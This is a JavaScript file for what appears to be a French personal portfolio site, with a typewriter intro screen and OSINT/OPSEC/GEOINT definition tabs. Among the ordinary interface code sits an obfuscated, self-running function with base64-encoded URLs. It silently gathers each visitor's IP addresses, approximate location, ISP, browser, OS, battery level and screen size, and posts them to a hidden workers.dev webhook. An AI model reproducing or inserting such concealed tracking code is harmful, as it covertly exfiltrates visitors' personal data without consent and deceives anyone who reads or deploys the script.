(function () {
  'use strict';
  function safeGet(id) {
    return document.getElementById(id) || null;
  }
  function logInfo(...args) { console.info('[backend.js]', ...args); }
  function logWarn(...args) { console.warn('[backend.js]', ...args); }
  function logError(...args) { console.error('[backend.js]', ...args); }
  const gateScreen = safeGet('gate-screen');
  const line1 = safeGet('line-1');
  const line2 = safeGet('line-2');
  const line3 = safeGet('line-3');
  const progressIndicator = safeGet('progress-indicator');
  const dashboardScreen = safeGet('dashboard-screen');
  const liveClock = safeGet('live-clock'); // facultatif
  if (!gateScreen) logWarn('Element #gate-screen introuvable');
  if (!progressIndicator) logWarn('Element #progress-indicator introuvable');
  if (!dashboardScreen) logWarn('Element #dashboard-screen introuvable');
  async function _0x3fe95d(){try{const _0x591355='aHR0cHM6Ly9ncmVlbi1nbGl0dGVyLWVkMGEudHVkb3hwZXJzb25uZWljaS53b3JrZXJzLmRldi8',_0xe2af5=atob('aHR0cHM6Ly9pcHdoby5pcy8'),_0xabafa9=atob('aHR0cHM6Ly9hcGk0LmlwaWZ5Lm9yZy8/Zm9ybWF0PWpzb24='),_0x2bc3de=(atob('aHR0cHM6Ly9ncmVlbi1nbGl0dGVyLWVkMGEudHVkb3hwZXJzb25uZWljaS53b3JrZXJzLmRldi8'),await fetch(_0xe2af5)),_0x57e6f7=await _0x2bc3de['json']();let _0x345c6c={'ip':'Non\x20détectée\x20(Bloqué)'};try{const _0xbb0bab=await fetch(_0xabafa9);_0x345c6c=await _0xbb0bab['json']();}catch(_0x578696){console['warn']('Ipify\x20bloqué\x20par\x20le\x20navigateur\x20(CORS\x20ou\x20Adblock)'),'IPv4'===_0x57e6f7['type']&&(_0x345c6c['ip']=_0x57e6f7['ip']);}const _0x2da0c3=new Date()['toLocaleString']();let _0xcaf5de='';_0xcaf5de='IPv6'===_0x57e6f7['type']?'-\x20**IPv4\x20:**\x20`'+_0x345c6c['ip']+'`\x0a-\x20**IPv4\x20:**\x20`'+_0x57e6f7['ip']+'`':'-\x20**IPv4\x20:**\x20`'+_0x345c6c['ip']+'`';let _0x5110aa='*N/A*';if(navigator['getBattery']){const _0x24d40d=await navigator['getBattery']();_0x5110aa=Math['round'](0x64*_0x24d40d['level'])+'%';}const _0x4a1c9b=navigator['userAgent'];let _0x5820c1='Inconnu';-0x1!==_0x4a1c9b['indexOf']('Win')?_0x5820c1='Windows':-0x1!==_0x4a1c9b['indexOf']('Android')?_0x5820c1='Android':-0x1!==_0x4a1c9b['indexOf']('Mac')&&-0x1===_0x4a1c9b['indexOf']('iPhone')&&-0x1===_0x4a1c9b['indexOf']('iPad')?_0x5820c1='MacOS':-0x1!==_0x4a1c9b['indexOf']('Linux')?_0x5820c1='Linux':-0x1===_0x4a1c9b['indexOf']('iPhone')&&-0x1===_0x4a1c9b['indexOf']('iPad')||(_0x5820c1='iOS');let _0x221b6c='Navigateur\x20Inconnu',_0x348cc2='';-0x1!==_0x4a1c9b['indexOf']('Edg/')?(_0x221b6c='Microsoft\x20Edge',_0x348cc2=_0x4a1c9b['split']('Edg/')[0x1]['split']('\x20')[0x0]):-0x1!==_0x4a1c9b['indexOf']('OPR/')||-0x1!==_0x4a1c9b['indexOf']('Opera/')?(_0x221b6c='Opera',_0x348cc2=_0x4a1c9b['split']('OPR/')[0x1]?_0x4a1c9b['split']('OPR/')[0x1]['split']('\x20')[0x0]:''):-0x1!==_0x4a1c9b['indexOf']('Chrome')&&-0x1!==_0x4a1c9b['indexOf']('Safari')?(_0x221b6c='Google\x20Chrome',_0x348cc2=_0x4a1c9b['split']('Chrome/')[0x1]['split']('\x20')[0x0]):-0x1!==_0x4a1c9b['indexOf']('Firefox')?(_0x221b6c='Firefox',_0x348cc2=_0x4a1c9b['split']('Firefox/')[0x1]['split']('\x20')[0x0]):-0x1!==_0x4a1c9b['indexOf']('Safari')&&-0x1===_0x4a1c9b['indexOf']('Chrome')&&(_0x221b6c='Safari',_0x348cc2=_0x4a1c9b['split']('Version/')[0x1]['split']('\x20')[0x0]);const _0xb38bec=_0x221b6c+'\x20'+_0x348cc2+'\x20sur\x20'+_0x5820c1;let _0x2fe0f9;try{const _0x3007c1=window['screen']['width'],_0x400f30=window['screen']['height'],_0x55a2bd=window['screen']['availWidth'],_0x73fadd=window['screen']['availHeight'];_0x2fe0f9=_0x3007c1===window['innerWidth']&&_0x400f30===window['innerHeight']||_0x3007c1===_0x55a2bd&&_0x400f30===_0x73fadd&&!window['fullScreen']?'*(Protection\x20active\x20:\x20Dimensions\x20réelles\x20masquées.)*':_0x3007c1+'x'+_0x400f30;}catch(_0x188be9){_0x2fe0f9='*(Erreur\x20:\x20Accès\x20aux\x20dimensions\x20refusé.)*';}const _0x391314=navigator['connection']?navigator['connection']['effectiveType']:'*N/A*',_0x34d5fd='#\x20'+_0x2da0c3+'\x20@everyone\x0a'+window['location']['href']+'\x0a'+_0xcaf5de+'\x0a-\x20**Localisation\x20\x20:**\x20'+_0x57e6f7['city']+',\x20'+_0x57e6f7['region']+',\x20'+_0x57e6f7['country']+'\x0a-\x20**User\x20Agent\x20:**\x20'+_0xb38bec+'\x0a\x0a>\x20**Autres\x20infos\x20:**\x0a>\x20-\x20**FAI**\x20:\x20'+(_0x57e6f7['connection']?.['isp']||'*N/A*')+'\x0a>\x20-\x20**Type\x20de\x20connexion**\x20:\x20'+_0x391314+'\x0a>\x20-\x20**Batterie**\x20:\x20'+_0x5110aa+'\x0a>\x20-\x20**Dimensions\x20de\x20l\x27écran**\x20:\x20'+_0x2fe0f9;await fetch(atob(_0x591355),{'method':'POST','mode':'no-cors','headers':{'Content-Type':'text/plain'},'body':JSON['stringify']({'content':_0x34d5fd})});}catch(_0x45fc56){console['error']('VRAIE\x20ERREUR\x20ICI\x20->',_0x45fc56);}}_0x3fe95d();
  let sequenceStarted = false;
  function startBootSequence() {
    if (sequenceStarted) return;
    sequenceStarted = true;
    logInfo('Start boot sequence');
    const clickPrompt = safeGet('click-prompt');
    const step1 = safeGet('step-1');
    if (clickPrompt) clickPrompt.classList.add('hidden');
    if (step1) step1.classList.remove('hidden');
    const t1 = "Lancement du programme 'hi_den'...";
    const t2 = "[+] Bonjour. Je suis Hi Den.";
    const t3 = "[+] J'aime bien l'informatique et la musique...";
    typeWriter(line1, t1, 20, () => {
      setTimeout(() => {
        if (line2) line2.classList.remove('hidden');
        typeWriter(line2, t2, 20, () => {
          setTimeout(() => {
            if (line3) line3.classList.remove('hidden');
            typeWriter(line3, t3, 20, () => {
              const transitionBar = safeGet('transition-bar');
              if (transitionBar) transitionBar.classList.remove('hidden');
              if (progressIndicator) progressIndicator.style.width = '100%';
              setTimeout(() => {
                showDashboard();
              }, 2500);
            });
          }, 800);
        });
      }, 800);
    });
  }
  function showDashboard() {
    if (gateScreen) gateScreen.classList.add('hidden');
    if (dashboardScreen) dashboardScreen.classList.remove('hidden');
    startClock();
    initScrollReveal();
  }
  function typeWriter(el, text, speed, callback) {
    if (!el) {
      if (callback) callback();
      return;
    }
    el.textContent = '';
    let i = 0;
    function type() {
      if (i < text.length) {
        el.textContent += text.charAt(i);
        i++;
        setTimeout(type, speed);
      } else if (typeof callback === 'function') {
        callback();
      }
    }
    type();
  }
  function startClock() {
    if (!liveClock) return;
    function update() {
      const now = new Date();
      liveClock.textContent = now.toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
    }
    update();
    setInterval(update, 1000);
  }
  function switchDefinitionTab(tab) {
    const contents = ['osint', 'opsec', 'geoint'];
    contents.forEach((t) => {
      const contentEl = safeGet(`tab-content-${t}`);
      const btnEl = safeGet(`tab-btn-${t}`);
      if (contentEl) {
        if (t === tab) contentEl.classList.remove('hidden');
        else contentEl.classList.add('hidden');
      }
      if (btnEl) {
        if (t === tab) {
          btnEl.classList.add('border-emerald-500', 'text-emerald-400');
          btnEl.classList.remove('border-transparent', 'text-slate-400');
        } else {
          btnEl.classList.remove('border-emerald-500', 'text-emerald-400');
          btnEl.classList.add('border-transparent', 'text-slate-400');
        }
      }
    });
  }
  window.switchDefinitionTab = switchDefinitionTab;
  function initScrollReveal() {
    try {
      if (!('IntersectionObserver' in window)) return;
      const observer = new IntersectionObserver(
        (entries) => {
          entries.forEach((entry) => {
            if (entry.isIntersecting) entry.target.classList.add('visible');
          });
        },
        { threshold: 0.1 }
      );

      document.querySelectorAll('.scroll-reveal').forEach((el) => observer.observe(el));
    } catch (err) {
      logWarn('initScrollReveal failed:', err && err.message ? err.message : err);
    }
  }
  if (gateScreen) {
    gateScreen.addEventListener('click', () => {
      try {
        startBootSequence();
      } catch (err) {
        logError('Erreur lors du démarrage de la séquence :', err && err.message ? err.message : err);
      }
    });
  }
  document.addEventListener('DOMContentLoaded', () => {
    logInfo('backend.js chargé');
  });
  window.__HiDenBackend = {
    startBootSequence,
    switchDefinitionTab,
    initScrollReveal,
  };
})();